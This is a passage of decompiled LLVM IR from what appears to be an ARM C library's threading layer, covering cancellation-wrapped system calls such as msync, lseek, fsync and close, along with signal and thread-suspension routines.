  store i32 %v3_d204, i32* @r4, align 4
  store i32 %v6_d204, i32* @r5, align 4
  ret i32 %v0_d23c
}

define i32 @msync() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v2_d24c = ptrtoint i32* %stack_var_-20 to i32
  %v0_d250 = load i32, i32* @r0, align 4
  store i32 %v0_d250, i32* @r4, align 4
  %v0_d254 = load i32, i32* @r1, align 4
  store i32 %v0_d254, i32* @r5, align 4
  %v0_d258 = load i32, i32* @r2, align 4
  store i32 %v0_d258, i32* @r6, align 4
  %v3_d264 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d24c)
  %v0_d268 = load i32, i32* @r5, align 4
  store i32 %v0_d268, i32* @r1, align 4
  %v0_d26c = load i32, i32* @r6, align 4
  store i32 %v0_d26c, i32* @r2, align 4
  %v0_d270 = load i32, i32* @r4, align 4
  store i32 %v0_d270, i32* @r0, align 4
  %v3_d274 = call i32 @__libc_msync(i32 %v0_d270, i32 %v0_d268, i32 %v0_d26c)
  store i32 %v3_d274, i32* @r4, align 4
  %v2_d280 = load i32, i32* %stack_var_-20, align 4
  %v2_d284 = trunc i32 %v2_d280 to i8
  %v3_d284 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d284, i32 0)
  %v0_d288 = load i32, i32* @r4, align 4
  ret i32 %v0_d288
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_d298 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  %v3_d2b4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d298)
  %v0_d2b8 = load i32, i32* @r5, align 4
  %v0_d2c0 = load i32, i32* @r6, align 4
  %v0_d2c4 = load i32, i32* @r4, align 4
  %v4_d2c8 = call i32 @__libc_lseek64(i32 %v0_d2c0, i32 %v0_d2c4, i32 %v0_d2b8, i32 %arg4)
  store i32 %v4_d2c8, i32* @r4, align 4
  store i32 %v0_d2c4, i32* @r5, align 4
  %v2_d2d4 = load i32, i32* %stack_var_-24, align 4
  %v2_d2dc = trunc i32 %v2_d2d4 to i8
  %v3_d2dc = call i32 @__GI_pthread_setcanceltype(i8 %v2_d2dc, i32 0)
  %v0_d2e0 = load i32, i32* @r4, align 4
  ret i32 %v0_d2e0
}

define i32 @lseek() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v6_d2f0 = load i32, i32* @r5, align 4
  %v9_d2f0 = load i32, i32* @r6, align 4
  %v2_d2f4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_d2f8 = load i32, i32* @r0, align 4
  store i32 %v0_d2f8, i32* @r4, align 4
  %v0_d2fc = load i32, i32* @r1, align 4
  store i32 %v0_d2fc, i32* @r5, align 4
  %v0_d300 = load i32, i32* @r2, align 4
  store i32 %v0_d300, i32* @r6, align 4
  %v3_d30c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d2f4)
  %v0_d310 = load i32, i32* @r5, align 4
  store i32 %v0_d310, i32* @r1, align 4
  %v0_d314 = load i32, i32* @r6, align 4
  store i32 %v0_d314, i32* @r2, align 4
  %v0_d318 = load i32, i32* @r4, align 4
  store i32 %v0_d318, i32* @r0, align 4
  %v3_d31c = call i32 @__GI___libc_lseek(i32 %v0_d318, i32 %v0_d310, i32 %v0_d314)
  store i32 %v3_d31c, i32* @r4, align 4
  %v2_d328 = load i32, i32* %stack_var_-20, align 4
  %v2_d32c = trunc i32 %v2_d328 to i8
  %v3_d32c = call i32 @__GI_pthread_setcanceltype(i8 %v2_d32c, i32 0)
  %v0_d330 = load i32, i32* @r4, align 4
  store i32 %v6_d2f0, i32* @r5, align 4
  store i32 %v9_d2f0, i32* @r6, align 4
  ret i32 %v0_d330
}

define i32 @fsync() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_d340 = ptrtoint i32* %stack_var_-12 to i32
  %v0_d348 = load i32, i32* @r0, align 4
  store i32 %v0_d348, i32* @r4, align 4
  %v3_d350 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d340)
  %v0_d354 = load i32, i32* @r4, align 4
  store i32 %v0_d354, i32* @r0, align 4
  %v1_d358 = call i32 @__libc_fsync(i32 %v0_d354)
  store i32 %v1_d358, i32* @r4, align 4
  %v2_d364 = load i32, i32* %stack_var_-12, align 4
  %v2_d368 = trunc i32 %v2_d364 to i8
  %v3_d368 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d368, i32 0)
  %v0_d36c = load i32, i32* @r4, align 4
  ret i32 %v0_d36c
}

define i32 @fcntl() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_d378 = load i32, i32* @r1, align 4
  %v0_d384 = load i32, i32* @r0, align 4
  store i32 %v0_d384, i32* @r4, align 4
  %v2_d388 = ptrtoint i32* %stack_var_-24 to i32
  %v3_d390 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d388)
  %v0_d3a0 = load i32, i32* @r4, align 4
  store i32 %v0_d3a0, i32* @r0, align 4
  %v2_d3a8 = call i32 @__libc_fcntl(i32 %v0_d3a0, i32 %v3_d378)
  store i32 %v2_d3a8, i32* @r4, align 4
  %v3_d3b4 = load i32, i32* %stack_var_-24, align 4
  %v2_d3b8 = trunc i32 %v3_d3b4 to i8
  %v3_d3b8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_d3b8, i32 0)
  %v0_d3bc = load i32, i32* @r4, align 4
  ret i32 %v0_d3bc
}

define i32 @close() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_d3d0 = load i32, i32* @r4, align 4
  %v2_d3d4 = ptrtoint i32* %stack_var_-12 to i32
  %v0_d3dc = load i32, i32* @r0, align 4
  store i32 %v0_d3dc, i32* @r4, align 4
  %v3_d3e4 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_d3d4)
  %v0_d3e8 = load i32, i32* @r4, align 4
  store i32 %v0_d3e8, i32* @r0, align 4
  %v1_d3ec = call i32 @__libc_close(i32 %v0_d3e8)
  store i32 %v1_d3ec, i32* @r4, align 4
  %v2_d3f8 = load i32, i32* %stack_var_-12, align 4
  %v2_d3fc = trunc i32 %v2_d3f8 to i8
  %v3_d3fc = call i32 @__GI_pthread_setcanceltype(i8 %v2_d3fc, i32 0)
  %v0_d400 = load i32, i32* @r4, align 4
  store i32 %v3_d3d0, i32* @r4, align 4
  ret i32 %v0_d400

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 36, 37, 50, 51, 46, 47, 40, 41, 48, 49, 30, 31, 32, 33, 42, 43, 34, 35, 38, 39 }
}

define i32 @__libc_current_sigrtmin(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d410 = load i32, i32* @global_var_2b558.342, align 4
  ret i32 %v2_d410
}

define i32 @__libc_current_sigrtmax(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d420 = load i32, i32* @global_var_2b55c.344, align 4
  ret i32 %v2_d420
}

define i32 @__libc_allocate_rtsig(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d430 = load i32, i32* @global_var_2b558.342, align 4
  %v1_d434 = add i32 %v2_d430, 1
  %v7_d434 = icmp eq i32 %v1_d434, 0
  br i1 %v7_d434, label %dec_label_pc_d46c, label %dec_label_pc_d444

dec_label_pc_d444:                                ; preds = %entry
  %v2_d444 = load i32, i32* @global_var_2b55c.344, align 4
  %v8_d44c = icmp sgt i32 %v2_d430, %v2_d444
  br i1 %v8_d44c, label %dec_label_pc_d46c, label %dec_label_pc_d450

dec_label_pc_d450:                                ; preds = %dec_label_pc_d444
  %v2_d450 = icmp eq i32 %arg1, 0
  br i1 %v2_d450, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_d450
  store i32 %v1_d434, i32* @global_var_2b558.342, align 4
  br label %dec_label_pc_d470

.thread1:                                         ; preds = %dec_label_pc_d450
  %v1_d458 = add i32 %v2_d444, -1
  store i32 %v1_d458, i32* @global_var_2b55c.344, align 4
  br label %dec_label_pc_d470

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d444, %entry
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %.thread, %.thread1, %dec_label_pc_d46c
  %v0_d470 = phi i32 [ %v2_d444, %.thread1 ], [ %v2_d430, %.thread ], [ -1, %dec_label_pc_d46c ]
  ret i32 %v0_d470

; uselistorder directives
  uselistorder label %dec_label_pc_d470, { 2, 1, 0 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v9_d480 = icmp eq i32 %arg1, %arg2
  %. = zext i1 %v9_d480 to i32
  ret i32 %.
}

define i32 @__pthread_find_self(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_270c0.348 to i32), i32* @r2, align 4
  %v1_d494 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_d494, i32* @r1, align 4
  br label %dec_label_pc_d4a0

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d4ac, %dec_label_pc_d4a0
  %v1_d49c = add i32 %v0_d49c, 16
  store i32 %v1_d49c, i32* @r2, align 4
  br label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %entry, %dec_label_pc_d49c
  %v0_d49c = phi i32 [ ptrtoint (i32* @global_var_270c0.348 to i32), %entry ], [ %v1_d49c, %dec_label_pc_d49c ]
  %v1_d4a0 = add i32 %v0_d49c, 8
  %v2_d4a0 = inttoptr i32 %v1_d4a0 to i32*
  %v3_d4a0 = load i32, i32* %v2_d4a0, align 4
  %tmp4 = icmp ugt i32 %v1_d494, %v3_d4a0
  br i1 %tmp4, label %dec_label_pc_d49c, label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d4a0
  %v1_d4ac = add i32 %v0_d49c, 12
  %v2_d4ac = inttoptr i32 %v1_d4ac to i32*
  %v3_d4ac = load i32, i32* %v2_d4ac, align 4
  %v3_d4b0 = icmp ult i32 %v1_d494, %v3_d4ac
  br i1 %v3_d4b0, label %dec_label_pc_d49c, label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d4ac
  %v2_d4b0.le = sub i32 %v1_d494, %v3_d4ac
  %v5_d4b0 = xor i32 %v2_d4b0.le, %v1_d494
  %v4_d4b0 = xor i32 %v3_d4ac, %v1_d494
  %v6_d4b0 = and i32 %v5_d4b0, %v4_d4b0
  %v7_d4b0 = icmp slt i32 %v6_d4b0, 0
  %v9_d4b0 = icmp eq i32 %v1_d494, %v3_d4ac
  store i1 %v7_d4b0, i1* @cpsr_v, align 1
  store i1 %v9_d4b0, i1* @cpsr_z, align 1
  ret i32 %v3_d4a0

; uselistorder directives
  uselistorder i32 %v3_d4ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d49c, { 1, 2, 0 }
  uselistorder i32 %v1_d494, { 5, 1, 2, 0, 4, 3, 6 }
  uselistorder label %dec_label_pc_d4a0, { 1, 0 }
}

define i32 @_thread_self.3() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_d4c4 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_d4c8 = load i32, i32* @sp, align 4
  %v3_d4c8 = icmp ult i32 %v0_d4c8, %v2_d4c4
  %v1_d4cc = ptrtoint i32* %stack_var_0 to i32
  br i1 %v3_d4c8, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_d4e8, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_d4e8 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_d4dc = load i32, i32* @global_var_2be50.182, align 4
  %v3_d4e0 = icmp ult i32 %v0_d4c8, %v2_d4dc
  br i1 %v3_d4e0, label %bb4, label %dec_label_pc_d4e8

dec_label_pc_d4e8:                                ; preds = %bb3
  %v2_d4ec = load i32, i32* @global_var_2be54.184, align 4
  %v3_d4f0 = icmp ult i32 %v0_d4c8, %v2_d4ec
  br i1 %v3_d4f0, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_d4e8, %bb3
  %v2_d500 = load i32, i32* @global_var_30238.188, align 4
  %v3_d504 = and i32 %v1_d4cc, -2097152
  %v4_d504 = xor i32 %v3_d504, -2097152
  %v2_d50c = icmp eq i32 %v2_d500, 0
  %v1_d510 = sub i32 -477, %v4_d504
  br i1 %v2_d50c, label %dec_label_pc_d51c, label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %bb4
  %v1_d518 = call i32 @__pthread_find_self(i32 %v1_d510)
  br label %dec_label_pc_d51c

dec_label_pc_d51c:                                ; preds = %bb4, %dec_label_pc_d518
  %v0_d51c = phi i32 [ %v1_d510, %bb4 ], [ %v1_d518, %dec_label_pc_d518 ]
  %v1_d51c = add i32 %v0_d51c, -3
  ret i32 %v1_d51c

; uselistorder directives
  uselistorder i32 %v1_d510, { 1, 0 }
  uselistorder label %dec_label_pc_d51c, { 1, 0 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_d540 = call i32 @_thread_self.3()
  %v1_d544 = add i32 %v0_d540, 16
  %v2_d544 = inttoptr i32 %v1_d544 to i32*
  %v3_d544 = load i32, i32* %v2_d544, align 4
  ret i32 %v3_d544
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v1_d54c = load i32, i32* @r0, align 4
  ret i32 %v1_d54c
}

define i32 @__pthread_setconcurrency(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_2be64.356, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  %v2_d568 = load i32, i32* @global_var_2be64.356, align 4
  ret i32 %v2_d568

; uselistorder directives
  uselistorder i32* @global_var_2be64.356, { 1, 0 }
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-500 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %v3_d574 = load i32, i32* @r4, align 4
  store i32 %tmp, i32* %stack_var_-508, align 4
  %v2_d584 = ptrtoint i32* %stack_var_-500 to i32
  store i32 %v2_d584, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v3_d58c = call i32 @__sigsetjmp(i32* nonnull %stack_var_-500, i32 1)
  store i32 %v3_d58c, i32* %r0.global-to-local, align 4
  %v2_d590 = icmp eq i32 %v3_d58c, 0
  br i1 %v2_d590, label %dec_label_pc_d59c, label %.dec_label_pc_d658_crit_edge

.dec_label_pc_d658_crit_edge:                     ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %.pre = add i32 %arg1, 36
  %.pre2 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_d658

dec_label_pc_d59c:                                ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_d5a0 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d5a0, i32* @r4, align 4
  %v2_d5a8 = add i32 %arg1, 36
  %v3_d5a8 = inttoptr i32 %v2_d5a8 to i32*
  store i32 %v2_d584, i32* %v3_d5a8, align 4
  %v0_d5ac = load i32, i32* %r0.global-to-local, align 4
  %v1_d5ac = load i32, i32* %r2.global-to-local, align 4
  %v2_d5ac = add i32 %v1_d5ac, 32
  %v3_d5ac = inttoptr i32 %v2_d5ac to i32*
  store i32 %v0_d5ac, i32* %v3_d5ac, align 4
  store i32 %v2_d5a0, i32* @r0, align 4
  %v1_d5b4 = call i32 @sigemptyset(i32 %v2_d5a0)
  store i32 %v2_d5a0, i32* @r0, align 4
  %v2_d5c0 = load i32, i32* @global_var_2b488.309, align 4
  %v2_d5c4 = call i32 @__GI_sigaddset(i32 %v2_d5a0, i32 %v2_d5c0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_d5d0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_d5d0, i32* %r2.global-to-local, align 4
  %v3_d5d4 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_d5d4 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_d5d4, i32 %v2_d5d0)
  store i32 %v4_d5d4, i32* %r0.global-to-local, align 4
  %v2_d5dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_d630 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d638, %dec_label_pc_d59c
  store i32 %v2_d5dc, i32* %r0.global-to-local, align 4
  %v0_d5e0 = call i32 @gettimeofday()
  store i32 %v0_d5e0, i32* %r0.global-to-local, align 4
  store i32 %tmp5, i32* %r2.global-to-local, align 4
  %v2_d5f0 = load i32, i32* %stack_var_-508, align 4
  %v1_d5f4 = inttoptr i32 %v2_d5f0 to i32*
  %v2_d5f4 = load i32, i32* %v1_d5f4, align 4
  store i32 %v2_d5f4, i32* %r2.global-to-local, align 4
  %v3_d5f4 = add i32 %v2_d5f0, 4
  %v4_d5f4 = inttoptr i32 %v3_d5f4 to i32*
  %v5_d5f4 = load i32, i32* %v4_d5f4, align 4
  %tmp16 = mul i32 %tmp5, -1000
  %v2_d5f8 = add i32 %v5_d5f4, %tmp16
  %v3_d5fc = load i32, i32* %stack_var_-16, align 4
  store i32 0, i32* @r1, align 4
  %v2_d604 = sub i32 %v2_d5f4, %v3_d5fc
  store i32 %v2_d604, i32* %r2.global-to-local, align 4
  %v8_d608 = icmp slt i32 %v2_d5f8, 0
  %v1_d60c = sext i1 %v8_d608 to i32
  %v1_d60c.v2_d604 = add i32 %v2_d604, %v1_d60c
  store i32 %v1_d60c.v2_d604, i32* %stack_var_-24, align 4
  %v2_d620 = add i32 %v2_d5f8, 1000000000
  store i32 %v2_d620, i32* @lr, align 4
  %v1_d62c = icmp slt i32 %v1_d60c.v2_d604, 0
  store i32 %v2_d630, i32* @r0, align 4
  br i1 %v1_d62c, label %dec_label_pc_d644, label %dec_label_pc_d638

dec_label_pc_d638:                                ; preds = %dec_label_pc_d5d8
  %v1_d638 = call i32 @__libc_nanosleep(i32 %v2_d630)
  store i32 %v1_d638, i32* %r0.global-to-local, align 4
  %v2_d63c = icmp eq i32 %v1_d638, 0
  br i1 %v2_d63c, label %dec_label_pc_d644, label %dec_label_pc_d5d8

dec_label_pc_d644:                                ; preds = %dec_label_pc_d638, %dec_label_pc_d5d8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d650 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_d650 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_d650, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d658

dec_label_pc_d658:                                ; preds = %.dec_label_pc_d658_crit_edge, %dec_label_pc_d644
  %v3_d660.pre-phi = phi i32* [ %.pre2, %.dec_label_pc_d658_crit_edge ], [ %v3_d5a8, %dec_label_pc_d644 ]
  store i32 %arg1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v3_d660.pre-phi, align 4
  store i32 %v3_d574, i32* @r4, align 4
  %v8_d668 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_d668

; uselistorder directives
  uselistorder i32 %v1_d60c.v2_d604, { 1, 0 }
  uselistorder i32 %v2_d5f8, { 1, 0 }
  uselistorder i32 %v2_d5f0, { 1, 0 }
  uselistorder i32 %v2_d5a0, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 5, 4, 7, 6, 11, 9, 12, 10, 0 }
  uselistorder i32 (i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 1000000000, { 1, 0 }
  uselistorder i32 (i32*, i32)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_d658, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_d680 = call i32 @kill()
  %v0_d684 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d684, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_d684 = load i32, i32* @r2, align 4
  %v2_d684 = load i32, i32* @r8, align 4
  %v5_d684 = mul i32 %v2_d684, 512
  %v6_d684 = and i32 %v5_d684, %v1_d684
  store i32 %v6_d684, i32* @fp, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_d680

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v3_d688 = load i32, i32* @r4, align 4
  %v2_d68c = ptrtoint i32* %stack_var_-140 to i32
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %v2_d68c, i32* @r4, align 4
  %v4_d6a4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_d68c)
  store i32 %v2_d68c, i32* @r0, align 4
  %v1_d6b4 = call i32 @__GI_sigdelset(i32 %v2_d68c)
  %v2_d6bc = add i32 %arg1, 32
  %v3_d6bc = inttoptr i32 %v2_d6bc to i32*
  store i32 0, i32* %v3_d6bc, align 4
  %v1_d6c4 = bitcast i32* %stack_var_-140 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_d6c0

dec_label_pc_d6c0:                                ; preds = %dec_label_pc_d6c0, %entry
  %v2_d6c4 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_d6c4)
  %v2_d6cc = load i32, i32* @global_var_2b488.309, align 4
  store i32 %v2_d6cc, i32* @r2, align 4
  %v0_d6d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_d6d0 = add i32 %v0_d6d0, 32
  %v2_d6d0 = inttoptr i32 %v1_d6d0 to i32*
  %v3_d6d0 = load i32, i32* %v2_d6d0, align 4
  %v9_d6d4 = icmp eq i32 %v3_d6d0, %v2_d6cc
  br i1 %v9_d6d4, label %dec_label_pc_d6dc, label %dec_label_pc_d6c0

dec_label_pc_d6dc:                                ; preds = %dec_label_pc_d6c0
  store i32 %v3_d688, i32* @r4, align 4
  ret i32 %v2_d6c4

; uselistorder directives
  uselistorder i32 %v2_d68c, { 1, 0, 3, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @_suspend.4(i32 %arg1) local_unnamed_addr {
entry:
  %v0_d6e8 = load i32, i32* @r0, align 4
  %v1_d6e8 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_d6e8)
  ret i32 %v1_d6e8
}

define i32 @pthread_onexit_process() local_unnamed_addr {
entry:
  %stack_var_-160 = alloca i32, align 4
  %v3_d6ec = load i32, i32* @r4, align 4
  %v2_d6f4 = load i32, i32* @global_var_2b484.197, align 4
  %v1_d6f8 = icmp slt i32 %v2_d6f4, 0
  %v2_d6fc = ptrtoint i32* %stack_var_-160 to i32
  %v0_d700 = load i32, i32* @r0, align 4
  store i32 %v0_d700, i32* @r5, align 4
  br i1 %v1_d6f8, label %dec_label_pc_d784, label %dec_label_pc_d708

dec_label_pc_d708:                                ; preds = %entry
  %v0_d708 = call i32 @_thread_self.3()
  store i32 %v0_d708, i32* %stack_var_-160, align 4
  store i32 %v0_d708, i32* @r4, align 4
  br label %dec_label_pc_d718

dec_label_pc_d718:                                ; preds = %dec_label_pc_d734, %dec_label_pc_d708
  store i32 %v2_d6fc, i32* @r1, align 4
  %v2_d720 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_d720, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_d728 = call i32 @__libc_write(i32 %v2_d720, i32 %v2_d6fc)
  %v3_d72c = icmp eq i32 %v2_d728, -1
  br i1 %v3_d72c, label %dec_label_pc_d734, label %dec_label_pc_d744

dec_label_pc_d734:                                ; preds = %dec_label_pc_d718
  %v0_d734 = call i32 @__errno_location()
  %v1_d738 = inttoptr i32 %v0_d734 to i32*
  %v2_d738 = load i32, i32* %v1_d738, align 4
  %v7_d73c = icmp eq i32 %v2_d738, 4
  br i1 %v7_d73c, label %dec_label_pc_d718, label %dec_label_pc_d744

dec_label_pc_d744:                                ; preds = %dec_label_pc_d718, %dec_label_pc_d734
  %v0_d744 = load i32, i32* @r4, align 4
  store i32 %v0_d744, i32* @r0, align 4
  %v1_d748 = call i32 @_suspend.4(i32 %v0_d744)
  %v2_d750 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  %v0_d754 = load i32, i32* @r4, align 4
  %v9_d754 = icmp eq i32 %v0_d754, %v2_d750
  br i1 %v9_d754, label %dec_label_pc_d75c, label %dec_label_pc_d784

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d744
  %v3_d764 = load i32, i32* @global_var_2b2b4.191, align 4
  %v3_d76c = call i32 @waitpid(i32 %v3_d764, i32 0, i32 -2147483648)
  store i32 0, i32* @global_var_2be50.182, align 4
  store i32 0, i32* @global_var_2be54.184, align 4
  br label %dec_label_pc_d784

dec_label_pc_d784:                                ; preds = %dec_label_pc_d744, %entry, %dec_label_pc_d75c
  %v11_d788 = phi i32 [ %v1_d748, %dec_label_pc_d744 ], [ %v0_d700, %entry ], [ %v3_d76c, %dec_label_pc_d75c ]
  store i32 %v3_d6ec, i32* @r4, align 4
  ret i32 %v11_d788

; uselistorder directives
  uselistorder i32 %v2_d6fc, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d744, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d7a0 = load i32, i32* @r4, align 4
  store i32 %v3_d7a0, i32* %stack_var_-20, align 4
  %v6_d7a0 = load i32, i32* @r5, align 4
  %v0_d7a4 = call i32 @_thread_self.3()
  store i32 ptrtoint (i32* @global_var_2b484.197 to i32), i32* @r5, align 4
  %v2_d7ac = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_d7ac, i32* %r3.global-to-local, align 4
  %v7_d7b0 = icmp eq i32 %v2_d7ac, -1
  store i32 ptrtoint (i32* @global_var_2be50.182 to i32), i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_30250.370 to i32), i32* @r7, align 4
  store i32 %v0_d7a4, i32* @r4, align 4
  br i1 %v7_d7b0, label %dec_label_pc_d7f8, label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %entry
  %v2_d7c4 = load i32, i32* @global_var_2be50.182, align 4
  store i32 %v2_d7c4, i32* @r0, align 4
  %v0_d7c8 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_2be54.184, align 4
  %v2_d7d8 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_d7d8, i32* @r0, align 4
  %v1_d7dc = load i32, i32* @r6, align 4
  %v2_d7dc = inttoptr i32 %v1_d7dc to i32*
  store i32 0, i32* %v2_d7dc, align 4
  %v1_d7e0 = call i32 @__libc_close(i32 %v2_d7d8)
  %v2_d7e4 = load i32, i32* @global_var_30250.370, align 4
  store i32 %v2_d7e4, i32* @r0, align 4
  %v1_d7e8 = call i32 @__libc_close(i32 %v2_d7e4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d7f0 = load i32, i32* @r5, align 4
  %v2_d7f0 = inttoptr i32 %v1_d7f0 to i32*
  store i32 -1, i32* %v2_d7f0, align 4
  %v0_d7f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d7f4 = load i32, i32* @r7, align 4
  %v2_d7f4 = inttoptr i32 %v1_d7f4 to i32*
  store i32 %v0_d7f4, i32* %v2_d7f4, align 4
  br label %dec_label_pc_d7f8

dec_label_pc_d7f8:                                ; preds = %entry, %dec_label_pc_d7c4
  %v0_d7f8 = call i32 @__libc_getpid()
  %v1_d800 = load i32, i32* @r4, align 4
  %v2_d800 = add i32 %v1_d800, 76
  %v3_d800 = inttoptr i32 %v2_d800 to i32*
  store i32 ptrtoint (i32* @global_var_2deac.373 to i32), i32* %v3_d800, align 4
  %v0_d808 = load i32, i32* @r4, align 4
  store i32 %v0_d808, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_2dea8.376 to i32), i32* %r3.global-to-local, align 4
  %v2_d810 = add i32 %v0_d808, 20
  %v3_d810 = inttoptr i32 %v2_d810 to i32*
  store i32 %v0_d7f8, i32* %v3_d810, align 4
